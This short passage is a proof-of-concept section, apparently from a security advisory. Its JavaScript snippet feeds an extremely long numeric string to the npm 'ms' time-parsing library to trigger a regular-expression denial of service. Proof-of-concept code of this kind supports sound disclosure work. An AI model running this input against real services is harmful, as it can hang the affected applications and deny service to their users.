      ## Proof of Concept
      ```javascript
      var ms = require('ms');
      var genstr = function (len, chr) {
         var result = "";
         for (i=0; i<=len; i++) {
             result = result + chr;
         }

         return result;
      }

      ms(genstr(process.argv[2], "5") + " minutea");

      ```

